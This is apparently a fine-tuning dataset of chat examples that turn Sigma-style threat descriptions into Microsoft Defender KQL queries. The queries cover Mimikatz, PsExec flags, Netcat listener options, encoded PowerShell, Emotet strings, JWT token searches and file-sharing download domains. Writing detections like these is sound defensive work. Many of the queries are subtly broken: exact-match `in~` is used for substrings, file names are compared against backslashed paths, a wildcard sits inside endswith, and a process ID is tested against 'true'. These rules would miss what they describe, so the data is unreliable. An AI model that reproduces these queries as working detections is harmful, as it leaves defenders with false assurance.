{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects static QMS 810 and mimikatz driver name used by Mimikatz as exploited in CVE-2021-1675 and CVE-2021-34527 Topic: registry_event_mimikatz_printernightmare"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Control\\\\Print\\\\Environments\\\\Windows x64\\\\Drivers\\\\Version-3\\\\QMS 810*\" or RegistryKey contains \"\\\\Control\\\\Print\\\\Environments\\\\Windows x64\\\\Drivers\\\\Version-3\\\\mimikatz\") or (RegistryKey contains \"legitprinter\" and RegistryKey contains \"\\\\Control\\\\Print\\\\Environments\\\\Windows\") or ((RegistryKey contains \"\\\\Control\\\\Print\\\\Environments\" or RegistryKey contains \"\\\\CurrentVersion\\\\Print\\\\Printers\") and (RegistryKey contains \"Gentil Kiwi\" or RegistryKey contains \"mimikatz printer\" or RegistryKey contains \"Kiwi Legit Printer\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects unknown program using commandline flags usually used by tools such as PsExec and PAExec to start programs with SYSTEM Privileges Topic: proc_creation_win_sysinternals_susp_psexec_paexec_flags"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -s cmd\" or ProcessCommandLine contains \" /s cmd\" or ProcessCommandLine contains \" \u2013s cmd\" or ProcessCommandLine contains \" \u2014s cmd\" or ProcessCommandLine contains \" \u2015s cmd\" or ProcessCommandLine contains \" -s -i cmd\" or ProcessCommandLine contains \" -s /i cmd\" or ProcessCommandLine contains \" -s \u2013i cmd\" or ProcessCommandLine contains \" -s \u2014i cmd\" or ProcessCommandLine contains \" -s \u2015i cmd\" or ProcessCommandLine contains \" /s -i cmd\" or ProcessCommandLine contains \" /s /i cmd\" or ProcessCommandLine contains \" /s \u2013i cmd\" or ProcessCommandLine contains \" /s \u2014i cmd\" or ProcessCommandLine contains \" /s \u2015i cmd\" or ProcessCommandLine contains \" \u2013s -i cmd\" or ProcessCommandLine contains \" \u2013s /i cmd\" or ProcessCommandLine contains \" \u2013s \u2013i cmd\" or ProcessCommandLine contains \" \u2013s \u2014i cmd\" or ProcessCommandLine contains \" \u2013s \u2015i cmd\" or ProcessCommandLine contains \" \u2014s -i cmd\" or ProcessCommandLine contains \" \u2014s /i cmd\" or ProcessCommandLine contains \" \u2014s \u2013i cmd\" or ProcessCommandLine contains \" \u2014s \u2014i cmd\" or ProcessCommandLine contains \" \u2014s \u2015i cmd\" or ProcessCommandLine contains \" \u2015s -i cmd\" or ProcessCommandLine contains \" \u2015s /i cmd\" or ProcessCommandLine contains \" \u2015s \u2013i cmd\" or ProcessCommandLine contains \" \u2015s \u2014i cmd\" or ProcessCommandLine contains \" \u2015s \u2015i cmd\" or ProcessCommandLine contains \" -i -s cmd\" or ProcessCommandLine contains \" -i /s cmd\" or ProcessCommandLine contains \" -i \u2013s cmd\" or ProcessCommandLine contains \" -i \u2014s cmd\" or ProcessCommandLine contains \" -i \u2015s cmd\" or ProcessCommandLine contains \" /i -s cmd\" or ProcessCommandLine contains \" /i /s cmd\" or ProcessCommandLine contains \" /i \u2013s cmd\" or ProcessCommandLine contains \" /i \u2014s cmd\" or ProcessCommandLine contains \" /i \u2015s cmd\" or ProcessCommandLine contains \" \u2013i -s cmd\" or ProcessCommandLine contains \" \u2013i /s cmd\" or ProcessCommandLine contains \" \u2013i \u2013s cmd\" or ProcessCommandLine contains \" \u2013i \u2014s cmd\" or ProcessCommandLine contains \" \u2013i \u2015s cmd\" or ProcessCommandLine contains \" \u2014i -s cmd\" or ProcessCommandLine contains \" \u2014i /s cmd\" or ProcessCommandLine contains \" \u2014i \u2013s cmd\" or ProcessCommandLine contains \" \u2014i \u2014s cmd\" or ProcessCommandLine contains \" \u2014i \u2015s cmd\" or ProcessCommandLine contains \" \u2015i -s cmd\" or ProcessCommandLine contains \" \u2015i /s cmd\" or ProcessCommandLine contains \" \u2015i \u2013s cmd\" or ProcessCommandLine contains \" \u2015i \u2014s cmd\" or ProcessCommandLine contains \" \u2015i \u2015s cmd\" or ProcessCommandLine contains \" -s pwsh\" or ProcessCommandLine contains \" /s pwsh\" or ProcessCommandLine contains \" \u2013s pwsh\" or ProcessCommandLine contains \" \u2014s pwsh\" or ProcessCommandLine contains \" \u2015s pwsh\" or ProcessCommandLine contains \" -s -i pwsh\" or ProcessCommandLine contains \" -s /i pwsh\" or ProcessCommandLine contains \" -s \u2013i pwsh\" or ProcessCommandLine contains \" -s \u2014i pwsh\" or ProcessCommandLine contains \" -s \u2015i pwsh\" or ProcessCommandLine contains \" /s -i pwsh\" or ProcessCommandLine contains \" /s /i pwsh\" or ProcessCommandLine contains \" /s \u2013i pwsh\" or ProcessCommandLine contains \" /s \u2014i pwsh\" or ProcessCommandLine contains \" /s \u2015i pwsh\" or ProcessCommandLine contains \" \u2013s -i pwsh\" or ProcessCommandLine contains \" \u2013s /i pwsh\" or ProcessCommandLine contains \" \u2013s \u2013i pwsh\" or ProcessCommandLine contains \" \u2013s \u2014i pwsh\" or ProcessCommandLine contains \" \u2013s \u2015i pwsh\" or ProcessCommandLine contains \" \u2014s -i pwsh\" or ProcessCommandLine contains \" \u2014s /i pwsh\" or ProcessCommandLine contains \" \u2014s \u2013i pwsh\" or ProcessCommandLine contains \" \u2014s \u2014i pwsh\" or ProcessCommandLine contains \" \u2014s \u2015i pwsh\" or ProcessCommandLine contains \" \u2015s -i pwsh\" or ProcessCommandLine contains \" \u2015s /i pwsh\" or ProcessCommandLine contains \" \u2015s \u2013i pwsh\" or ProcessCommandLine contains \" \u2015s \u2014i pwsh\" or ProcessCommandLine contains \" \u2015s \u2015i pwsh\" or ProcessCommandLine contains \" -i -s pwsh\" or ProcessCommandLine contains \" -i /s pwsh\" or ProcessCommandLine contains \" -i \u2013s pwsh\" or ProcessCommandLine contains \" -i \u2014s pwsh\" or ProcessCommandLine contains \" -i \u2015s pwsh\" or ProcessCommandLine contains \" /i -s pwsh\" or ProcessCommandLine contains \" /i /s pwsh\" or ProcessCommandLine contains \" /i \u2013s pwsh\" or ProcessCommandLine contains \" /i \u2014s pwsh\" or ProcessCommandLine contains \" /i \u2015s pwsh\" or ProcessCommandLine contains \" \u2013i -s pwsh\" or ProcessCommandLine contains \" \u2013i /s pwsh\" or ProcessCommandLine contains \" \u2013i \u2013s pwsh\" or ProcessCommandLine contains \" \u2013i \u2014s pwsh\" or ProcessCommandLine contains \" \u2013i \u2015s pwsh\" or ProcessCommandLine contains \" \u2014i -s pwsh\" or ProcessCommandLine contains \" \u2014i /s pwsh\" or ProcessCommandLine contains \" \u2014i \u2013s pwsh\" or ProcessCommandLine contains \" \u2014i \u2014s pwsh\" or ProcessCommandLine contains \" \u2014i \u2015s pwsh\" or ProcessCommandLine contains \" \u2015i -s pwsh\" or ProcessCommandLine contains \" \u2015i /s pwsh\" or ProcessCommandLine contains \" \u2015i \u2013s pwsh\" or ProcessCommandLine contains \" \u2015i \u2014s pwsh\" or ProcessCommandLine contains \" \u2015i \u2015s pwsh\" or ProcessCommandLine contains \" -s powershell\" or ProcessCommandLine contains \" /s powershell\" or ProcessCommandLine contains \" \u2013s powershell\" or ProcessCommandLine contains \" \u2014s powershell\" or ProcessCommandLine contains \" \u2015s powershell\" or ProcessCommandLine contains \" -s -i powershell\" or ProcessCommandLine contains \" -s /i powershell\" or ProcessCommandLine contains \" -s \u2013i powershell\" or ProcessCommandLine contains \" -s \u2014i powershell\" or ProcessCommandLine contains \" -s \u2015i powershell\" or ProcessCommandLine contains \" /s -i powershell\" or ProcessCommandLine contains \" /s /i powershell\" or ProcessCommandLine contains \" /s \u2013i powershell\" or ProcessCommandLine contains \" /s \u2014i powershell\" or ProcessCommandLine contains \" /s \u2015i powershell\" or ProcessCommandLine contains \" \u2013s -i powershell\" or ProcessCommandLine contains \" \u2013s /i powershell\" or ProcessCommandLine contains \" \u2013s \u2013i powershell\" or ProcessCommandLine contains \" \u2013s \u2014i powershell\" or ProcessCommandLine contains \" \u2013s \u2015i powershell\" or ProcessCommandLine contains \" \u2014s -i powershell\" or ProcessCommandLine contains \" \u2014s /i powershell\" or ProcessCommandLine contains \" \u2014s \u2013i powershell\" or ProcessCommandLine contains \" \u2014s \u2014i powershell\" or ProcessCommandLine contains \" \u2014s \u2015i powershell\" or ProcessCommandLine contains \" \u2015s -i powershell\" or ProcessCommandLine contains \" \u2015s /i powershell\" or ProcessCommandLine contains \" \u2015s \u2013i powershell\" or ProcessCommandLine contains \" \u2015s \u2014i powershell\" or ProcessCommandLine contains \" \u2015s \u2015i powershell\" or ProcessCommandLine contains \" -i -s powershell\" or ProcessCommandLine contains \" -i /s powershell\" or ProcessCommandLine contains \" -i \u2013s powershell\" or ProcessCommandLine contains \" -i \u2014s powershell\" or ProcessCommandLine contains \" -i \u2015s powershell\" or ProcessCommandLine contains \" /i -s powershell\" or ProcessCommandLine contains \" /i /s powershell\" or ProcessCommandLine contains \" /i \u2013s powershell\" or ProcessCommandLine contains \" /i \u2014s powershell\" or ProcessCommandLine contains \" /i \u2015s powershell\" or ProcessCommandLine contains \" \u2013i -s powershell\" or ProcessCommandLine contains \" \u2013i /s powershell\" or ProcessCommandLine contains \" \u2013i \u2013s powershell\" or ProcessCommandLine contains \" \u2013i \u2014s powershell\" or ProcessCommandLine contains \" \u2013i \u2015s powershell\" or ProcessCommandLine contains \" \u2014i -s powershell\" or ProcessCommandLine contains \" \u2014i /s powershell\" or ProcessCommandLine contains \" \u2014i \u2013s powershell\" or ProcessCommandLine contains \" \u2014i \u2014s powershell\" or ProcessCommandLine contains \" \u2014i \u2015s powershell\" or ProcessCommandLine contains \" \u2015i -s powershell\" or ProcessCommandLine contains \" \u2015i /s powershell\" or ProcessCommandLine contains \" \u2015i \u2013s powershell\" or ProcessCommandLine contains \" \u2015i \u2014s powershell\" or ProcessCommandLine contains \" \u2015i \u2015s powershell\") and (not((ProcessCommandLine in~ (\"paexec\", \"PsExec\", \"accepteula\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects rundll32 execution without parameters as observed when running Metasploit windows/smb/psexec exploit module Topic: proc_creation_win_rundll32_without_parameters"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"rundll32.exe\", \"rundll32\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains Topic: proc_creation_win_powershell_base64_encoded_cmd_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" JAB\", \" SUVYI\", \" SQBFAFgA\", \" aWV4I\", \" IAB\", \" PAA\", \" aQBlAHgA\")) and (ProcessCommandLine in~ (\" -e \", \" -en \", \" -enc \", \" -enco\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.Exe\", \"pwsh.dll\")))) and (not((InitiatingProcessFileName in~ (\"C:\\\\Packages\\\\Plugins\\\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\\\", \"\\\\gc_worker.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a startup item plist file, that automatically get executed at boot initialization to establish persistence.\nAdversaries may use startup items automatically executed at boot initialization to establish persistence.\nStartup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.\n Topic: file_event_macos_susp_startup_item_created"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".plist\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of an AnyDesk binary with a version prior to 8.0.8.\nPrior to version 8.0.8, the Anydesk application used a signing certificate that got compromised by threat actors.\nUse this rule to detect instances of older versions of Anydesk using the compromised certificate\nThis is recommended in order to avoid attackers leveraging the certificate and signing their binaries to bypass detections.\n Topic: proc_creation_win_remote_access_tools_anydesk_revoked_cert"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\AnyDesk.exe\" or ProcessVersionInfoFileDescription =~ \"AnyDesk\" or ProcessVersionInfoProductName =~ \"AnyDesk\" or ProcessVersionInfoCompanyName =~ \"AnyDesk Software GmbH\") and (ProcessVersionInfoProductVersion startswith \"7.0.\" or ProcessVersionInfoProductVersion startswith \"7.1.\" or ProcessVersionInfoProductVersion startswith \"8.0.1\" or ProcessVersionInfoProductVersion startswith \"8.0.2\" or ProcessVersionInfoProductVersion startswith \"8.0.3\" or ProcessVersionInfoProductVersion startswith \"8.0.4\" or ProcessVersionInfoProductVersion startswith \"8.0.5\" or ProcessVersionInfoProductVersion startswith \"8.0.6\" or ProcessVersionInfoProductVersion startswith \"8.0.7\")) and (not((ProcessCommandLine in~ (\" --remove\", \" --uninstall\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects \"svchost.exe\" spawning \"rundll32.exe\" with command arguments like \"C:\\windows\\system32\\davclnt.dll,DavSetCookie\".\nThis could be an indicator of exfiltration or use of WebDav to launch code (hosted on a WebDav server).\n Topic: proc_creation_win_rundll32_webdav_client_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"C:\\\\windows\\\\system32\\\\davclnt.dll,DavSetCookie\" and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\") and InitiatingProcessFileName =~ \"\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"HVCIDisallowedImages\" registry value to potentially add a driver to the list, in order to prevent it from loading.\n Topic: registry_set_hvci_disallowed_images"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Control\\\\CI*\" and RegistryKey contains \"\\\\HVCIDisallowedImages\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process characteristics of Winnti Pipemon malware reported by ESET Topic: proc_creation_win_apt_winnti_pipemon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"setup0.exe -p\" or ((ProcessCommandLine endswith \"-x:0\" or ProcessCommandLine endswith \"-x:1\" or ProcessCommandLine endswith \"-x:2\") and ProcessCommandLine =~ \"setup.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of Netcat. Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network Topic: proc_creation_win_pua_netcat"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -lvp \", \" -lvnp\", \" -l -v -p \", \" -lv -p \", \" -l --proxy-type http \", \" -vnl --exec \", \" -vnl -e \", \" --lua-exec \", \" --sh-exec \")) or (InitiatingProcessFolderPath in~ (\"\\\\nc.exe\", \"\\\\ncat.exe\", \"\\\\netcat.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of \"DumpMinitool.exe\" a tool that allows the dump of process memory via the use of the \"MiniDumpWriteDump\" Topic: proc_creation_win_dumpminitool_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" Full\", \" Mini\", \" WithHeap\")) and ((FolderPath endswith \"\\\\DumpMinitool.exe\" or FolderPath endswith \"\\\\DumpMinitool.x86.exe\" or FolderPath endswith \"\\\\DumpMinitool.arm64.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"DumpMinitool.exe\", \"DumpMinitool.x86.exe\", \"DumpMinitool.arm64.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when a user performs data exfiltration by using DataSvcUtil.exe Topic: proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/in:\", \"/out:\", \"/uri:\")) and (FolderPath endswith \"\\\\DataSvcUtil.exe\" or ProcessVersionInfoOriginalFileName =~ \"DataSvcUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of bitsadmin downloading a file from a suspicious domain Topic: proc_creation_win_bitsadmin_download_file_sharing_domains"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".githubusercontent.com\", \"anonfiles.com\", \"cdn.discordapp.com\", \"ddns.net\", \"dl.dropboxusercontent.com\", \"ghostbin.co\", \"glitch.me\", \"gofile.io\", \"hastebin.com\", \"mediafire.com\", \"mega.nz\", \"onrender.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"privatlab.com\", \"privatlab.net\", \"send.exploit.in\", \"sendspace.com\", \"storage.googleapis.com\", \"storjshare.io\", \"supabase.co\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"ufile.io\", \"w3spaces.com\", \"workers.dev\")) and (ProcessCommandLine in~ (\" /transfer \", \" /create \", \" /addfile \")) and (FolderPath endswith \"\\\\bitsadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"bitsadmin.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker tries to modify an already existing scheduled tasks to run from a suspicious location\nAttackers can create a simple looking task in order to avoid detection on creation as its often the most focused on\nInstead they modify the task after creation to include their malicious payload\n Topic: proc_creation_win_schtasks_change"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" /Change \", \" /TN \")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\") and (ProcessCommandLine in~ (\"regsvr32\", \"rundll32\", \"cmd /c \", \"cmd /k \", \"cmd /r \", \"cmd.exe /c \", \"cmd.exe /k \", \"cmd.exe /r \", \"powershell\", \"mshta\", \"wscript\", \"cscript\", \"certutil\", \"bitsadmin\", \"bash.exe\", \"bash \", \"scrcons\", \"wmic \", \"wmic.exe\", \"forfiles\", \"scriptrunner\", \"hh.exe\", \"hh \")) and (ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Temp\", \"\\\\AppData\\\\Roaming\\\\\", \"\\\\Users\\\\Public\\\\\", \"\\\\WINDOWS\\\\Temp\\\\\", \"\\\\Desktop\\\\\", \"\\\\Downloads\\\\\", \"\\\\Temporary Internet\", \"C:\\\\ProgramData\\\\\", \"C:\\\\Perflogs\\\\\", \"%ProgramData%\", \"%appdata%\", \"%comspec%\", \"%localappdata%\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects calls to PowerShell with Invoke-WebRequest cmdlet using direct IP access Topic: proc_creation_win_powershell_invoke_webrequest_direct_ip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"curl \", \"Invoke-WebRequest\", \"iwr \", \"wget \")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and (ProcessCommandLine in~ (\"://1\", \"://2\", \"://3\", \"://4\", \"://5\", \"://6\", \"://7\", \"://8\", \"://9\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible search for JWT tokens via CLI by looking for the string \"eyJ0eX\" or \"eyJhbG\".\nThis string is used as an anchor to look for the start of the JWT token used by microsoft office and similar apps.\n Topic: proc_creation_win_susp_jwt_token_search"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"eyJ0eXAiOi\", \"eyJhbGciOi\", \" eyJ0eX\", \" \\\"eyJ0eX\\\"\", \" 'eyJ0eX'\", \" eyJhbG\", \" \\\"eyJhbG\\\"\", \" 'eyJhbG'\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects uncommon or suspicious child processes of \"eventvwr.exe\" which might indicate a UAC bypass attempt Topic: proc_creation_win_eventvwr_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\eventvwr.exe\" and (not((InitiatingProcessFolderPath in~ (\":\\\\Windows\\\\System32\\\\mmc.exe\", \":\\\\Windows\\\\System32\\\\WerFault.exe\", \":\\\\Windows\\\\SysWOW64\\\\WerFault.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects all Emotet like process executions that are not covered by the more generic rules Topic: proc_creation_win_malware_emotet"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"JABlAG4AdgA6AHUAcwBlAHIAcAByAG8AZgBpAGwAZQ\", \"QAZQBuAHYAOgB1AHMAZQByAHAAcgBvAGYAaQBsAGUA\", \"kAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlA\", \"IgAoACcAKgAnACkAOwAkA\", \"IAKAAnACoAJwApADsAJA\", \"iACgAJwAqACcAKQA7ACQA\", \"JABGAGwAeAByAGgAYwBmAGQ\", \"PQAkAGUAbgB2ADoAdABlAG0AcAArACgA\", \"0AJABlAG4AdgA6AHQAZQBtAHAAKwAoA\", \"9ACQAZQBuAHYAOgB0AGUAbQBwACsAKA\") or (ProcessCommandLine contains \" -e\" and ProcessCommandLine contains \" PAA\")) and (not((ProcessCommandLine in~ (\"fAAgAEMAbwBuAHYAZQByAHQAVABvAC0ASgBzAG8AbgAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQ\", \"wAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUA\", \"8ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBKAHMAbwBuACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlA\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Dnx.EXE. The Dnx utility allows for the execution of C# code.\nAttackers might abuse this in order to bypass application whitelisting.\n Topic: proc_creation_win_dnx_execute_csharp_code"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\dnx.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a macro file for Outlook. Topic: file_event_win_office_outlook_susp_macro_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Microsoft\\\\Outlook\\\\VbaProject.OTM\" and (not(InitiatingProcessFolderPath =~ \"\\\\outlook.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a network connection initiated by the \"hh.exe\" process to HTTP destination ports, which could indicate the execution/download of remotely hosted .chm files.\n Topic: net_connection_win_hh_http_connection"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and InitiatingProcessFolderPath =~ \"\\\\hh.exe\" and (RemotePort in~ (\"80\", \"443\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect set DisallowRun to 1 to prevent user running specific computer program Topic: registry_set_disallowrun_execution"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\\DisallowRun\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects disabling Windows Defender Exploit Guard Network Protection Topic: registry_set_disabled_exploit_guard_net_protection_on_ms_defender"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows Defender Security Center\\\\App and Browser protection\\\\DisallowExploitProtectionOverride\" and RegistryValueData =~ \"DWORD (00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Formbook like process executions that inject code into a set of files in the System32 folder, which executes a special command command line to delete the dropper from the AppData Temp folder. We avoid false positives by excluding all parent process with command line parameters. Topic: proc_creation_win_malware_formbook"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \".exe\" and ((ProcessCommandLine contains \"/c\" and ProcessCommandLine contains \"del\" and ProcessCommandLine contains \"C:\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\AppData\\\\Local\\\\Temp\\\\\") or (ProcessCommandLine contains \"/c\" and ProcessCommandLine contains \"del\" and ProcessCommandLine contains \"C:\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Desktop\\\\\") or (ProcessCommandLine contains \"/C\" and ProcessCommandLine contains \"type nul >\" and ProcessCommandLine contains \"C:\\\\Users\\\\\" and ProcessCommandLine contains \"\\\\Desktop\\\\\")) and ProcessCommandLine endswith \".exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potentially suspicious file downloads from file sharing domains using wget.exe Topic: proc_creation_win_wget_download_susp_file_sharing_domains"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".ps1\" or ProcessCommandLine endswith \".ps1'\" or ProcessCommandLine endswith \".ps1\\\"\" or ProcessCommandLine endswith \".dat\" or ProcessCommandLine endswith \".dat'\" or ProcessCommandLine endswith \".dat\\\"\" or ProcessCommandLine endswith \".msi\" or ProcessCommandLine endswith \".msi'\" or ProcessCommandLine endswith \".msi\\\"\" or ProcessCommandLine endswith \".bat\" or ProcessCommandLine endswith \".bat'\" or ProcessCommandLine endswith \".bat\\\"\" or ProcessCommandLine endswith \".exe\" or ProcessCommandLine endswith \".exe'\" or ProcessCommandLine endswith \".exe\\\"\" or ProcessCommandLine endswith \".vbs\" or ProcessCommandLine endswith \".vbs'\" or ProcessCommandLine endswith \".vbs\\\"\" or ProcessCommandLine endswith \".vbe\" or ProcessCommandLine endswith \".vbe'\" or ProcessCommandLine endswith \".vbe\\\"\" or ProcessCommandLine endswith \".hta\" or ProcessCommandLine endswith \".hta'\" or ProcessCommandLine endswith \".hta\\\"\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".dll'\" or ProcessCommandLine endswith \".dll\\\"\" or ProcessCommandLine endswith \".psm1\" or ProcessCommandLine endswith \".psm1'\" or ProcessCommandLine endswith \".psm1\\\"\") and (ProcessCommandLine matches regex \"\\\\s-O\\\\s\" or ProcessCommandLine contains \"--output-document\") and ProcessCommandLine =~ \"http\" and (FolderPath endswith \"\\\\wget.exe\" or ProcessVersionInfoOriginalFileName =~ \"wget.exe\") and (ProcessCommandLine in~ (\".githubusercontent.com\", \"anonfiles.com\", \"cdn.discordapp.com\", \"ddns.net\", \"dl.dropboxusercontent.com\", \"ghostbin.co\", \"glitch.me\", \"gofile.io\", \"hastebin.com\", \"mediafire.com\", \"mega.nz\", \"onrender.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"pixeldrain.com\", \"privatlab.com\", \"privatlab.net\", \"send.exploit.in\", \"sendspace.com\", \"storage.googleapis.com\", \"storjshare.io\", \"supabase.co\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"ufile.io\", \"w3spaces.com\", \"workers.dev\"))"}]}
